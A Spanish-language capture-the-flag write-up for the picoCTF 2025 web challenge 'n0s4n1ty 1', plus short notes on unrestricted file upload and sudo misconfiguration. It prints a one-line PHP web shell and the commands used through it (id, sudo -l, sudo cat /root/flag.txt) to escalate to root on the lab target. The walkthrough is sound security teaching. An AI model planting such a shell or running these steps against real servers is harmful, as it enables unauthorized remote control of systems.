
## DESCRIPCION

- A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the `/root` directory. You can access the web application here!
## SOLUCION

```

- Se accedió a la aplicación web proporcionada por el reto, identificando una funcionalidad de carga de imágenes de perfil que no aplicaba ningún tipo de validación sobre el tipo de archivo o su extensión (Unrestricted File Upload).
    
- Se creó un archivo malicioso local denominado `shell.php` con el siguiente contenido: `<?php system($_GET['cmd']); ?>`. Este script actuaría como un Web Shell, permitiendo la ejecución de comandos a través del parámetro `cmd` en la URL.
    
- Se subió exitosamente el archivo `shell.php` a través del formulario de la aplicación web. El servidor respondió confirmando la carga y revelando la ruta de almacenamiento: `uploads/shell.php`.
    
- Se verificó la ejecución remota de comandos (RCE) navegando a la URL `http://<DIRECCION_DEL_RETO>/uploads/shell.php?cmd=id`. La respuesta del servidor mostró `uid=33(www-data) gid=33(www-data)`, confirmando que el código PHP se ejecutaba con los privilegios del usuario del servidor web.
    
- Se procedió a la fase de escalada de privilegios. Se envió el comando `sudo -l` a través del Web Shell (`?cmd=sudo -l`) para enumerar los permisos del usuario actual. El servidor respondió con `(ALL) NOPASSWD: ALL`, indicando que el usuario `www-data` podía ejecutar cualquier comando como root sin necesidad de contraseña.
    
- Se listó el contenido del directorio restringido `/root` utilizando el comando `sudo ls /root` a través del Web Shell, lo que reveló la presencia del archivo `flag.txt`.
    
- Se ejecutó el comando final para leer el archivo objetivo: `sudo cat /root/flag.txt` a través del Web Shell, obteniendo así la bandera (flag) del reto en la salida estándar del navegador.
```
## NOTAS ADICIONALES
- - **Unrestricted File Upload (Carga de Archivos Sin Restricciones):** Esta vulnerabilidad ocurre cuando un servidor web permite a los usuarios subir archivos sin validar su extensión, tipo MIME o contenido. Si el directorio de carga tiene permisos de ejecución (como suele ocurrir en servidores PHP mal configurados), un atacante puede subir código malicioso (como un Web Shell) y ejecutarlo en el servidor. Esto otorga al atacante una puerta trasera persistente para interactuar con el sistema operativo subyacente.
    
- **Escalada de Privilegios mediante Sudo (Sudo Privilege Escalation):** En sistemas Linux, `sudo` permite a los usuarios ejecutar comandos con los privilegios de otro usuario (normalmente root). Una mala configuración común es otorgar permisos `NOPASSWD: ALL` a usuarios de servicios web (como `www-data`). Esto permite que, si un atacante compromete la aplicación web, pueda escalar inmediatamente a privilegios de superusuario y comprometer todo el sistema, accediendo a directorios protegidos como `/root`.

## REFERENCIAS

- - Reto original: picoCTF 2025 - Categoría: Web Exploitation (n0s4n1ty 1).
    
- Conceptos aplicados: File Upload Vulnerability, Web Shell, Remote Code Execution (RCE), Linux Privilege Escalation, Sudo Misconfiguration.